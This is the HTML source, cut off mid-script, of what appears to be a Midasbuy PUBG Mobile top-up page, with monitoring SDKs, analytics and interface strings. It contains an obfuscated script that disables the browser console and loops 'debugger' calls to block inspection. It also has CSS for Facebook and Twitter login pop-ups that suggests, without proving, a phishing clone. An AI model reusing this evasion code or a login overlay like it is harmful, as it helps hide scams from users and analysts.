XMLHttpRequest;i.__sendByAegis=!0,i.addEventListener("readystatechange",function(){4===i.readyState&&(400<=i.status?n&&n(i.response):t&&t(i.response))}),"get"===r.toLocaleLowerCase()?(i.open("get",function(e,n){if("string"!=typeof e)return"";if("object"==typeof n&&n){var t=Object.getOwnPropertyNames(n).map(function(e){var t=n[e];return e+"="+("string"==typeof t?encodeURIComponent(t):encodeURIComponent(JSON.stringify(t)))}).join("&").replace(/eval/gi,"evaI");return e+(-1===e.indexOf("?")?"?":"&")+t}return e}(o,e.data)),i.send()):(i.open("post",o),e.contentType&&i.setRequestHeader("Content-Type",e.contentType),"string"==typeof e.data&&(e.data=e.data.replace(/eval/gi,"evaI")),i.send(e.data))}},s._speedLogPipeline=oe([(o={},function(e,t){if(Array.isArray(e)){var n=e.filter(function(e){var t=!o[e.url];return o[e.url]=!0,t});n.length&&t(n)}else o[e.url]||t(e),o[e.url]=!0}),$(s.config.delay),te(s),function(e,t){s.lifeCycle.emit("beforeReportSpeed",e);var n=s.config.beforeReportSpeed;if("function"==typeof n&&(e=e.filter(function(e){var t=!1!==n(e);return"fetch"===e.type&&void 0===e.ret&&e.payload&&(e.ret=g(e.payload.data.response,s.config.api)),t})),e.length)return t(e)},function(e){s.send({url:""+s.config.speedUrl,method:"post",data:function(e,t){var n={fetch:[],static:[]},o=new FormData;if(Array.isArray(e))e.forEach(function(e){var t=se(e);n[e.type].push(t)});else{var r=se(e);n[e.type].push(r)}return o.append("payload",JSON.stringify(y({duration:n},t))),o}(e,s.bean)})}]);try{e.uin=e.uin||parseInt((document.cookie.match(/\buin=\D+(\d*)/)||[])[1],10)||parseInt((document.cookie.match(/\bilive_uin=\D*(\d+)/)||[])[1],10)||"",e.offlineLog&&s._initOfflineLog(),e.shadowLog&&s._initShadowLog(),s.init(e,fe),s.extendBean("sessionId",fe._sessionID)}catch(e){console.warn(e),console.log("%c以上错误发生在初始化 Aegis 的过程中，将会影响您正常使用 Aegis，\n建议您联系 aegis-helper，进行反馈，感谢您的支持。","color: red"),s._sendSDKError(e)}return s}return ce.use(function(){this.config.listenOnerror&&R.push(this._normalLogPipeline),function(){if(!L){L=!0;var n=window.onerror;window.onerror=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];e[4]&&_({msg:e[4],level:v.ERROR}),n&&n.call.apply(n,function(){for(var e=0,t=0,n=arguments.length;t<n;t++)e+=arguments[t].length;var o=Array(e),r=0;for(t=0;t<n;t++)for(var i=arguments[t],s=0,a=i.length;s<a;s++,r++)o[r]=i[s];return o}([window],e))},window.addEventListener("unhandledrejection",function(e){_({msg:"PROMISE_ERROR: "+(e&&b(e.reason)),level:v.PROMISE_ERROR})});var i=0;window.document.addEventListener("error",function(e){if(e&&e.target&&e.srcElement){var t=e.target||e.srcElement,n=t.src||t.href,o=t.tagName;if(n&&o){var r={msg:o+" load fail: "+n,level:v.INFO};switch(o.toLowerCase()){case"script":r.level=v.SCRIPT_ERROR;break;case"link":r.level=v.CSS_ERROR;break;case"img":if(10<i)return;i++,r.level=v.IMAGE_ERROR;break;case"audio":case"video":r.level=v.MEDIA_ERROR;break;default:return}_(r)}}},!0);var e=window.XMLHttpRequest.prototype,t=e.open,o=e.send;e.open=function(){return this.aegisMethod&&this.aegisUrl||(this.aegisMethod=arguments[0],this.aegisUrl=arguments[1]),t.apply(this,arguments)},e.send=function(){return this.__sendByAegis||this.addEventListener("loadend",function(){this.aegisTimeout?_({msg:"AJAX_ERROR: request timeout. status: "+this.status+". \n url: "+this.aegisUrl,level:v.AJAX_ERROR}):0===this.status?_({msg:"AJAX_ERROR: request failed. status: "+this.status+". \n url: "+this.aegisUrl,level:v.AJAX_ERROR}):400<=this.status&&_({msg:"AJAX_ERROR: request error. status: "+this.status+". \n url: "+this.aegisUrl,level:v.AJAX_ERROR})}),this.__sendByAegis||this.addEventListener("timeout",function(){this.aegisTimeout=!0}),o.apply(this,arguments)}}}()}),ce.use(function(){var a,e,t,n;this.config.reportApiSpeed&&(M.push(this._speedLogPipeline),H.push(this._normalLogPipeline),q||(q=!0,function(u){if("function"==typeof window.fetch){var e=window.fetch;window.fetch=function(i,s){var a=Date.now();return e(i,s).then(function(r){try{var e=r.headers?r.headers.get("content-type"):"";r.ok&&"string"==typeof e&&p(e)?U({url:l(r.url),isHttps:d(r.url),method:s&&s.method||"get",duration:Date.now()-a,type:"static",status:r.status,urlQuery:l(r.url,!0),x5ContentType:c.string,x5HttpStatusCode:c.number,x5ImgDecodeStatus:c.number,x5ErrorCode:c.number,x5LoadFromLocalCache:c.number,x5ContentLength:c.number,domainLookup:c.number,connectTime:c.number}):r.clone().text().then(function(e){X({msg:i+" "+e,level:v.API_RESPONSE});var t=g(e,u.api);U({url:l(r.url),isHttps:d(r.url),method:s&&s.method||"get",duration:Date.now()-a,type:"fetch",ret:t||"unknown",status:r.status,payload:new O(r,e)});var n=u.api&&u.api.errCode;n=n&&[].concat(n);var o=u.api&&u.api.code;o=o&&[].concat(o),(n&&-1!==n.indexOf(t)||o&&-1===o.indexOf(t)||!n&&!o&&"0"!==t&&"unknown"!==t)&&X({msg:"request url: "+i+" \n response: "+e,level:v.RET_ERROR})})}catch(e){}return r}).catch(function(e){throw U({url:l(i),isHttps:d(i),method:s&&s.method||"get",duration:Date.now()-a,type:"fetch",status:600}),e})}}}(this.config),a=this.config,e=window.XMLHttpRequest.prototype,t=e.open,n=e.send,e.open=function(){return this.aegisMethod&&this.aegisUrl||(this.aegisMethod=arguments[0],this.aegisUrl=arguments[1]),t.apply(this,arguments)},e.send=function(){var i=Date.now(),s=0;return this.__sendByAegis||this.addEventListener("loadend",function(){var e=this.aegisUrl;if(e){s=Date.now()-i;var t={url:l(e),isHttps:d(e),status:this.status,method:this.aegisMethod||"get",type:"fetch",duration:s,payload:new m(this)},n=this.getResponseHeader("content-type");if(400<=this.status||"string"!=typeof n||!p(n))try{X({msg:"req url: "+e+" \nres time: "+s+" \nres data: "+this.response,level:v.API_RESPONSE}),t.ret=g(this.response,a.api);var o=a.api&&a.api.errCode;o=o&&[].concat(o);var r=a.api&&a.api.code;r=r&&[].concat(r),(o&&-1!==o.indexOf(t.ret)||r&&-1===r.indexOf(t.ret)||!o&&!r&&"0"!==t.ret&&"unknown"!==t.ret)&&X({msg:"request url: "+e+" \n response: "+this.response,level:v.RET_ERROR})}catch(e){t.ret="unknown"}else t.type="static",delete t.ret,Object.assign(t,{urlQuery:l(e,!0),x5ContentType:c.string,x5HttpStatusCode:c.number,x5ImgDecodeStatus:c.number,x5ErrorCode:c.number,x5LoadFromLocalCache:c.number,x5ContentLength:c.number,domainLookup:c.number,connectTime:c.number});U(t)}}),n.apply(this,arguments)}))}),ce.use(function(){a()&&this.config.reportAssetSpeed&&(A.push(this._speedLogPipeline),C||(C=!0,setInterval(T,this.config.delay),performance.onresourcetimingbufferfull=function(){P=0,performance.clearResourceTimings()},window.document.addEventListener("error",function(e){if(e&&e.target&&e.srcElement){var t=e.target||e.srcElement,n=t.src||t.href;n&&I({url:l(n),status:400,method:"get",type:"static",isHttps:d(n),urlQuery:l(n,!0),x5ContentType:c.string,x5HttpStatusCode:c.number,x5ImgDecodeStatus:c.number,x5ErrorCode:c.number,x5LoadFromLocalCache:c.number,x5ContentLength:c.number,domainLookup:c.number,connectTime:c.number})}},!0)))}),ce.use(function(){var c,n,f,l,o=this;if(a())if(k.push(this.send),j)N(j,this);else try{c=function(e){var t=performance.timing,n=t.loadEventStart-t.domInteractive;n<0&&(n=1070),N(j={dnsLookup:t.domainLookupEnd-t.domainLookupStart,tcp:t.connectEnd-t.connectStart,ssl:0===t.secureConnectionStart?0:t.requestStart-t.secureConnectionStart,ttfb:t.responseStart-t.requestStart,contentDownload:t.responseEnd-t.responseStart,domParse:t.domInteractive-t.domLoading,resourceDownload:n,firstScreenTiming:Math.floor(e)},o)},n=["script","style","link","br"],f=[],(l=new MutationObserver(function(e){var t={roots:[],rootsDomNum:[],time:performance.now()};e.forEach(function(e){e&&e.addedNodes&&e.addedNodes.forEach&&e.addedNodes.forEach(function(e){1!==e.nodeType||-1!==n.indexOf(e.nodeName.toLocaleLowerCase())||function e(t,n){return!(!t||t===document.documentElement)&&(-1!==n.indexOf(t)||e(t.parentElement,n))}(e,t.roots)||(t.roots.push(e),t.rootsDomNum.push(function e(t){var n=0;if(t&&1===t.nodeType){n++;var o=t.children;if(o&&o.length)for(var r=0;r<o.length;r++)n+=e(o[r])}return n}(e)||0))})}),t.roots.length&&f.push(t)})).observe(document,{childList:!0,subtree:!0}),setTimeout(function(){l.disconnect();var n=0,o=0,r=!1;f.forEach(function(e){for(var t=0;t<e.roots.length;t++)e.rootsDomNum[t]>n&&D(e.roots[t])&&(n=e.rootsDomNum[t],o=e.time)});for(var e=document.querySelectorAll(".fp-check"),i=[],t=0;t<e.length;t++)if("img"===e[t].tagName.toLowerCase()&&""!==e[t].src)i.push(e[t].src);else{var s=window.getComputedStyle(e[t]),a=/url\([\'\"](.+)[\'\"]\)/gi.exec(s.backgroundImage);a&&2===a.length&&i.push(a[1])}var u=0;window.performance.getEntriesByType("resource").some(function(n){return i.some(function(e,t){if(e===n.name)return n.responseEnd>u&&(u=n.responseEnd),(n.fetchStart<o||n.startTime<o)&&n.responseEnd>o&&(r=!0,o=n.responseEnd),i.splice(t,1),!0}),0===i.length}),0===o&&(o=u),c(r?o:o+25)},3e3)}catch(c){}}),ce.use(function(){var t=this;!function(e){try{var t=window.localStorage.getItem("AEGIS_ID");t||(t="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)}),window.localStorage.setItem("AEGIS_ID",t)),e(t||"")}catch(t){e("")}}(function(e){t.bean.aid=e})}),ce.use(function(e){var t;this.config.tjg&&(t=e,B||(B=!0,function(n){if("function"==typeof window.fetch){var o=window.fetch;window.fetch=function(e,t){return G(e)&&("object"==typeof t&&t?t.headers?t.headers instanceof Headers&&t.headers.append("X-Tjg-Json-Span-Context",F(n)):t.headers=new Headers({"X-Tjg-Json-Span-Context":F(n)}):t={headers:new Headers({"X-Tjg-Json-Span-Context":F(n)})}),o(e,t)}}}(t),function(e){if(window.XMLHttpRequest){var t=window.XMLHttpRequest.prototype.send,n=window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open=function(){return!this.__sendByAegis&&G(arguments[1])&&(this.useTjg=!0),n.apply(this,arguments)},window.XMLHttpRequest.prototype.send=function(){return this.useTjg&&this.setRequestHeader("X-Tjg-Json-Span-Context",F(e)),t.apply(this,arguments)}}}(t)))}),ce.use(function(){var e;this.config.reportAssetSpeed&&(this.extendBean("platform",(e=W.other,/\bAndroid\s*([^;]+)/.test(Z)?e=W.android:/\b(iPad|iPhone|iPod)\b.*? OS ([\d_]+)/.test(Z)&&(e=W.ios),e)),this.extendBean("x5Type",function(){var e=Q.other;if(0<=Z.indexOf("tbs")){var t=Z.match(/tbs\/([\d\.]+)/);e=t&&t[1]&&36541<=parseInt(t[1],10)?Q.newX5:Q.oldX5}return e}()),this.extendBean("netType",K.unknown))}),ce});
    var aegis = new Aegis({
        id: 1124,
        uin: __Report_INFO.midasuid,
        beforeReport: function(log) {
            // 这个错误是模拟器环境报的，不需要上报
            if(log.level == 4 && log.msg) {
                if(log.msg.indexOf('__tbsRecieveNativeEvent__')!==-1 || log.msg.indexOf('getReadMode')!==-1)
                return false
            }
        },
        reportApiSpeed: true, // 接口测速
        reportAssetSpeed: true // 静态资源测速
    });
    // aegis.infoAll('aegis: Interview from ' + __Report_INFO.midasuid);
</script>
    
    
      <script type="text/javascript" src="https://cdn.midasbuy.com/h5/overseah5/js/midas-oversea-h5page.js"></script>
    

    <script type="text/javascript" src="https://cdn.midasbuy.com/oversea_web/static/js/jquery.js?jslib=1"></script>
    <script type="text/javascript" src="https://cdn.midasbuy.com/oversea_web/static/js/swiper3_4_2/swiper.jquery.min.js?jslib=1"></script>
    
    
        
        <script type="text/javascript" src="https://cdn.midasbuy.com/oversea_web/static/js/vue.min.2.6.10.js?jslib=1"></script>
        
    

    

        <script src="https://cdn.midasbuy.com/oversea_web/static/js/report.9d9089dc.js"></script>
    

    
 
    <script type="text/javascript" >
        !function(r){var n={};function o(e){if(n[e])return n[e].exports;var t=n[e]={i:e,l:!1,exports:{}};return r[e].call(t.exports,t,t.exports,o),t.l=!0,t.exports}o.m=r,o.c=n,o.d=function(e,t,r){o.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},o.r=function(e){'undefined'!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:'Module'}),Object.defineProperty(e,'__esModule',{value:!0})},o.t=function(t,e){if(1&e&&(t=o(t)),8&e)return t;if(4&e&&'object'==typeof t&&t&&t.__esModule)return t;var r=Object.create(null);if(o.r(r),Object.defineProperty(r,'default',{enumerable:!0,value:t}),2&e&&'string'!=typeof t)for(var n in t)o.d(r,n,function(e){return t[e]}.bind(null,n));return r},o.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return o.d(t,'a',t),t},o.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},o.p="https://cdn.midasbuy.com/oversea_web/static/",o(o.s="KdNV")}({Entu:function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.default=function(e){for(var t=1;t<=arguments.length;t++)if(arguments[t])for(var r in arguments[t])Object.prototype.hasOwnProperty.call(arguments[t],r)&&(e[r]=arguments[t][r]);return e}},KdNV:function(e,t,r){"use strict";r.r(t);var n=r("Entu"),o=r.n(n),u=window,i=window.__Report_INFO||{},f={doReport:function(e,t){var r=i.from||'',n=i.midasuid||'';u.fbq('track',e,o()({uuid:n,pf:r},t||{}))}};u.fbReport=f}});
    </script> 



    
<script type="text/javascript">
    var _0x3d88=['log','debug','info','error','exception','table','warn','trace','apply','debu','gger','don','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','console'];(function(_0x4b152f,_0x59d86c){var _0x5c135a=function(_0x5b5d0f){while(--_0x5b5d0f){_0x4b152f['push'](_0x4b152f['shift']());}};_0x5c135a(++_0x59d86c);}(_0x3d88,0x170));var _0x306c=function(_0x4b152f,_0x59d86c){_0x4b152f=_0x4b152f-0x0;var _0x5c135a=_0x3d88[_0x4b152f];return _0x5c135a;};(function(_0x2605bc){var _0x4c9a2c=function(){var _0x244728=!![];return function(_0x3efc74,_0x16c2ac){var _0x4d7b05=_0x244728?function(){if(_0x16c2ac){var _0x45ed49=_0x16c2ac[_0x306c('0x0')](_0x3efc74,arguments);_0x16c2ac=null;return _0x45ed49;}}:function(){};_0x244728=![];return _0x4d7b05;};}();var _0x4ed3d0=[_0x306c('0x1'),_0x306c('0x2'),_0x306c('0x3')];function _0x17f16e(){var _0x41d7ca=_0x4c9a2c(this,function(){var _0x6c13c9=function(){};var _0x187a25=function(){var _0x23d8ab;try{_0x23d8ab=Function(_0x306c('0x4')+_0x306c('0x5')+');')();}catch(_0x15bb1a){_0x23d8ab=window;}return _0x23d8ab;};var _0x4a78e1=_0x187a25();if(!_0x4a78e1[_0x306c('0x6')]){_0x4a78e1[_0x306c('0x6')]=function(_0x6c13c9){var _0x19ef79={};_0x19ef79[_0x306c('0x7')]=_0x6c13c9;_0x19ef79['warn']=_0x6c13c9;_0x19ef79[_0x306c('0x8')]=_0x6c13c9;_0x19ef79[_0x306c('0x9')]=_0x6c13c9;_0x19ef79[_0x306c('0xa')]=_0x6c13c9;_0x19ef79[_0x306c('0xb')]=_0x6c13c9;_0x19ef79[_0x306c('0xc')]=_0x6c13c9;_0x19ef79['trace']=_0x6c13c9;return _0x19ef79;}(_0x6c13c9);}else{_0x4a78e1[_0x306c('0x6')][_0x306c('0x7')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xd')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0x8')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0x9')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xa')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xb')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xc')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xe')]=_0x6c13c9;}});_0x41d7ca();return function(){return eval(_0x4ed3d0[0x0]+_0x4ed3d0[0x1]);};}_0x2605bc[_0x4ed3d0[0x2]]=_0x17f16e();setInterval(_0x4ed3d0[0x2]+'()',0xc8);}(window));
</script>


    <script type="text/javascript">

        var goServerUrl = "//www.midasbuy.com/midas/usc/v1/123123";
        var goPublicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+DHIWQ7lNnwufS03eXfHeytqUH2OWxoFMP67o38bq/7PB1NaikC3Wb4O8bKF5L2iyIVD2M/QxtcV178BIUP6qJxAHly6B+xC3FJXONeYMQfL3D3GxaSavR/vlJhoaacXpCn30dj1njeVjsMWjJrUjqOCHuMY3UX+h6LrBIB3iywIDAQAB";
        var langResource = {"title":"PUBG Mobile - Midasbuy","adyenCashback":{"closeBtn":"confirm","desc":"Make a purchase with your card on Midasbuy for a chance to win a 100% cashback<br/>Event period: 12/12-12/23 (UTC+8)<br/>Country: Saudi Arabia, Kuwait, Qatar, UAE<br/>Only users who make purchases by card are eligible to participate in this campaign<br/>Midasbuy will fully refund the amount of your current purchase if you win the 100% cashback<br/>The list of prize winners will be announced on our Facebook account every day","subTitle":"","title":""},"bubblePop":{"bubbleTips":"REGISTER TO GET <span>PUBGM FREE</span> ITEM","promoteTips":"Get PUBGM exclusive registeration gift for <span>FREE</span>"},"channelRestore":{"default":{"helpBtn":"OK","helpDesc":"The payment channel system is under maintenance, please choose another payment method","helpTitle":"Announcement"}},"channel_awards_tip":"Get <span class='light'>FREE REWARDS</span> when purchasing UC using the following payment method(s)","checkRight4":" By ticking this box, you confirm that you have read and agreed to the <a target='_blank' href='https://cdn.midasbuy.com/h5/overseah5/html/supplementary-terms-v2.html'>Supplementary Terms</a> and understand how it applies to your purchase and use of virtual goods and virtual currency in Playerunknown's BattleGround Mobile. These terms will be binding between you and Proxima Beta PTE. Limited.","checkRight5":"You hereby consent to immediate performance of the contract and acknowledge that you will lose your right of withdrawal from the contract once the download or use of the virtual goods and/or virtual currency has commenced.","currencyBtn":"Purchase","errorMap":{"1138-1-12186":"Please choose another region to recharge.","1138-1-12200":"Please choose another region to recharge.","1138-1-12201":"Please choose another region to recharge.","1138-1-12202":"Please choose another region to recharge.","1138-1-12204":"Please choose another region to recharge.","1138-30051-12186":"Please choose another region to recharge.","1138-30051-12200":"Please choose another region to recharge.","1138-30051-12201":"Please choose another region to recharge.","1138-30051-12202":"Please choose another region to recharge.","1138-30051-12204":"Please choose another region to recharge."},"errorTips":{"attention":"Tip","confirm":"OK","invaliduserid":"Please enter a valid User ID.","tokenexpire":"Please refresh and try again."},"facebookButton":"Follow","footer":{"copyright":"COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED."},"gameIdInvalid":"Invalid Game ID","gameIdRequired":"Enter Game ID","getInfoAsap":"Follow us on {0} for more information.","goToOthers":"Go to your country","header":{"accountSettings":"View Account","checkVipStatus":"Check your status after log in","events":"Event Center","helpcenter":"Help Center","helpcenterLink":"https://cdn.midasbuy.com/oversea_web/faq/faq.html","index":"Home","login":"SIGN IN","logout":"Sign Out","midasVip":"Midasbuy VIP","pcenter":"Account  Setting","register":"CREATE ACCOUNT","transactionRecord":"Transcation Record"},"itemBtn":"Items","ok":"OK","redeemBtn":"Redeem","shopBtn":"Shop","xianyici":"One Purchase Only","birthConfirmBtn":"OK","birthdayError":"Unfortunately we are unable to offer Midasbuy service to you at this time.","cancelPayBtn":"Back","cantFindId":"Couldn't find your Player ID?","checkRight1":"By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a> and understand how it applies to your use of Midasbuy.","checkRight2":"By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>  and understand how it applies to your use of Midasbuy.","checkRight3":"By ticking this box, you agree to transfer your data outside of the European Economic Area. Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. , a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and  the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>.","choosePayAmount":"Select Product","choosePayMethod":"Payment Method","clausePopTitle":"Please check the following box to continue.","completedPay":"Payment completed","enterBirthday":"Enter birthday","enterBirthdayTitle":"Please confirm your birthday","extraPoints":"Extra Points","findIdButton":"OK","findIdGuide1":"1. Enter the game","findIdGuide2":"2. Find your player ID","findIdTitle":"Couldn't find your Player ID?","gameIdLoginCharacName":"Nickname","gameIdLoginId":"Player ID","gameIdLoginInput":"Please enter Player ID","gameIdLoginModifyButton":"Edit","gameIdLoginOkButton":"OK","gameIdLoginTitle":"Player ID Verification","iknow":"OK","otherPayMethod":"Other Payment Method","payButton":"Pay now","paymentFailButton":"Back","paymentFailTitle":"Payment failed.","pleasePayASAP":"Please complete the payment soon","queryingNoRes":"Payment result not found","queryingNoResTips":"There might be some lag. If the payment has been completed, please check the game later.","queryingPay":"Query has been made. Please wait","taxLabel":"Price includes taxes","taxesBoxPop":{"discount":"Discount","earnPoints":"Earn Points","earnValues":"Earn Values","origiPrice":"Original Price","summaryTitle":"PRICE SUMMARY","taxes":"Taxes","tips":" ","total":"Total"},"totalPrice":"Total:","wxQrCodeGuide1":"Tap to save QR code to album.","wxQrCodeGuide2":"Scan the QR code with WeChat to complete payment.","wxQrCodeOtherChoice":"You can also recharge from your computer.","wxQrCodeOtherLink":"www.midasbuy.com/hk/pubgm","wxQrCodeTitle":"Please scan the QR code with WeChat to complete payment."};
        var footerLan = {"cookieCloseBtn":"Save and close","cookieOff":"OFF","cookieOn":"ON","cookieP1":"We use cookies that are necessary to provide the service and also other cookies, including third-party cookies for performance and analysis. For more information on our cookie policy, please click here.    ","cookieP2":"These cookies are necessary to provide you with the service and to use some of its features, such as to facilitate transactions.","cookieP3":"These cookies are used to measure and analyse how the service is accessed, used, or is performing in order to provide you with a better   user experience and to maintain, operate and continually improve the service.","cookieT":"YOUR COOKIE PREFERENCES","cookieT2":"Necessary Cookies","cookieT3":"Analytics Cookies","copyright":"COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.","cstips1":"For customer service ","cstips2":"Please send email to help@midasbuy.com","feedback":"Feedback","privacystatement":"Privacy Policy","termofcookie":"Cookie Perferences","termofservice":"Terms of Service"};
        var showWelcomeBack = 1
        // 获取红点变量 需要考虑控制台还没配置变量的情况 在header.ts中的红点逻辑需要做相应的控制
        var redPointConfigs = {"showRedPoint2Unlogin":false,"vipCenter":{"beforeElement":true,"show":true,"show2Unlogin":true,"version":"Tue, 19 Aug 2020 10:57:00 GMT+0800"}}
        var user = null
        var fbPixelId = "4122111147803299"
        var jumpHomePage = false;
        var bubblePopConfig = {"bubbleShow":true,"href":"https://www.midasbuy.com/midasbuy/{0}/event/register/pubgm?lan=en&from=__mds_buy_bubble","promoteShow":true,"repalce":false}
        var vipcenterConfig = {"directLinks":{"earnValuesLink":"./shop/pubgm","goToPurchaseLink":"./buy/pubgm"},"helpcenterLink":"https://cdn.midasbuy.com/oversea_web/faq/vipfaq.html","luckyDraw":{"eventLink":"/event/viplottery/mds","eventValid":0,"images":{"mobileBgImage":"//cdn.midasbuy.com/images/drawbgmobilecb28a5a2.png","pcBgImage":"//cdn.midasbuy.com/images/drawbgpcbfde7b8c.png"},"spend":""},"showLuckyDraw":1,"showVipEntrance":1,"showVipFAQ":1,"taskCenter":{"checkin":"sign","defaultChannel":"os_credit_card","goPurcharseLink":"/buy/pubgm?from=taskcenter","groupid":"TASK210108144131141","notVipTaskIds":["0be7d83bb624df3e","a6b605c15cf17030"],"taskid":"a6b605c15cf17030","transMapLanKey":{"0be7d83bb624df3e":"checkinday","4c1a92fbce48be46":"checkinweek","a6b605c15cf17030":"cardPayTask"}},"toastTimeout":2000};
    </script>
    <script type="text/javascript">
    var sdk_rules=[{
         rule:"^https:\\/\\/nearme\\.atlas\\.com\\/\\?.*",
         type:"url",
         url:"https://{env}.api.unipay.qq.com/h5/overseah5/views/oppo/result.html"
    },{
        rule:"^gojek:.*",
        type:"scheme"
    },{
        rule:"^intent:.*",
        type:"intent"
    },{
        rule:"^weixin:.*",
        type:"scheme"
    }];
</script>
    

    <style type="text/css">
        input::-ms-clear {
            display: none;
        }
        .footer ul {
            margin-right: 15px;
        }
        .popup-login {
    background: rgba(0, 0, 0, 0.5);
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index:9999;
}
.popup-box-login-fb {
    background: #ECEFF6;
    max-width: 350px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 6%;
    text-align: center;
    font-family: 'Teko';
    color: #000;
    border-radius: 10px;
}
.popup-box-login-twitter {
    background: #fff;
    max-width: 330px;
    height: 350px;
    position: relative;
    margin: 50px auto;
    margin-top: 10%;
    text-align: center;
    font-family: 'Teko';
    color: #000;
    border-radius: 10px;
}
.close-fb {
    background: #000;
    width: 20px;
    height: 20px;
    color: #fff;
    text-align: center;
    text-decoration: none;
    border-radius: 50%;
    border: 1.5px solid #fff;
    position: absolute;
    top: -8px;
    right: -10px;
    display: block;
}
.close-fb i {
    color: #fff;
    padding-top: 3px;
}
.close-other {
    background: #000;
    width: 20px;
    height: 20px;
    color: #fff;
    text-align: center;
    text-decoration: none;
    border-radius: 50%;
    border: 1.5px solid #fff;
    top: -8px;
    right: -10px;
    position: absolute;
    z-index: 9999999;
    display: block;
}
.close-other i {
    color: #fff;
    padding-top: 3px;
}
@media only screen and (max-width:600px) {
    .popup-box-login-fb {
        width: 330px;
        margin-top: 20%;
    }
    .popup-box-login-twitter {
        margin-top: 25%;
    }
}

        input::-ms-clear {
            display: none;
        }
        .footer ul {
            margin-right: 15px;
        }
        .clause-box-pop{display: none;}
    </style>
    <script>
        
    </script>
    <script>
        jQuery.fn.placeholder = function () {
            var i = document.createElement('input'),placeholdersupport ='placeholder' in i;
            if(!placeholdersupport){
                var inputs = jQuery(this);
                inputs.each(function(){
                    var input = jQuery(this),
                        text = input.attr('placeholder'),
                        pdl = 0,height = input.outerHeight(),
                        width = input.outerWidth(),
                        placeholder = jQuery('<span class="phTips">'+text+'</span>');
                        try{
                            pdl = input.css('padding-left').match(/\d*/i)[0] * 1;
                        }catch(e){
                            pdl = 5;
                        }
                        placeholder.css({
                            'margin-left': -(width-pdl),
                            'height':height,
                            'line-height':height+'px',
                            'position':'absolute',
                            'color': '#cecfc9',
                            'font-size' : '12px'
                        });
                        placeholder.click(function(){
                            input.focus();
                        });
                        if(input.val() != ''){
                            placeholder.css({display:'none'});
                        }else{
                            placeholder.css({display:'inline'});
                        }
                        placeholder.insertAfter(input);
                        input.keydown(function(e){
                            placeholder.css({display:'none'});
                        });
                        input.keyup(function(e){
                            if(jQuery(this).val() != ''){
                                placeholder.css({display:'none'});
                            }else{
                                placeholder.css({display:'inline'});
                            }
                        });
                    });
                }
            return this;
        };

    </script>
    <script type="text/javascript">
        window.dataLayer = window.dataLayer || [];
    </script>
    <!-- Google Tag Manager -->
    
        <script>
            (function(w, d, s, l, i) {
                w[l] = w[l] || [];
                w[l].push({
                    'gtm.start': new Date().getTime(),
                    event: 'gtm.js'
                });
                var f = d.getElementsByTagName(s)[0],
                    j = d.createElement(s),
                    dl = l !== 'dataLayer' ? '&l=' + l : '';
                j.async = true;
                j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
                f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-NSB6GPJ');
        </script>
    
    <!-- End Google Tag Manager -->
    <script type="text/javascript">
        var loadJS = function(d, s, id,src) { if(!src){return;}
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s);
            js.id = id;
            js.src = src;
            fjs.parentNode.insertBefore(js, fjs);
        };  
        // scrollFun 不能被去掉或注释，注释了会导致 交易记录在移动端展示不全       
        function scrollFun() {
            var wInnerH = $(window).height(); // 设备窗口的高度（不会变）
            var bScrollH = $(document).height(); // 滚动条总高度
            var footerH = $('.have-pay-sec .footer').outerHeight();
            var footerHeight = $('.footer').outerHeight();
            var headerHeight = $('.header-box').outerHeight();
            if (wInnerH === bScrollH) {
                $('.pay-sec').addClass('pay-sec-flex');
                $('.pay-sec').show();
                // if (typeof newui === 'undefined') {
                //     $('.pay-sec').css('bottom', footerH + 'px');
                // }
                $('.have-pay-sec .footer').show();
                $('.record .form-box-wrap-1 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.record .form-box-wrap-2 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                if (
                    wInnerH -
                        ($('.special-box').offset() ? $('.special-box').offset().top : 0) -
                        $('.special-box').outerHeight() >
                    footerHeight + 16
                ) {
                    $('.special-foot .footer').show();
                } else {
                    $('.wrap').removeClass('special-foot');
                }
            } else {
                $('.record-detailt-pop .detailt-box').css('max-height', (wInnerH - headerHeight - 74) + 'px');
                $('.record .form-box-wrap-1 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
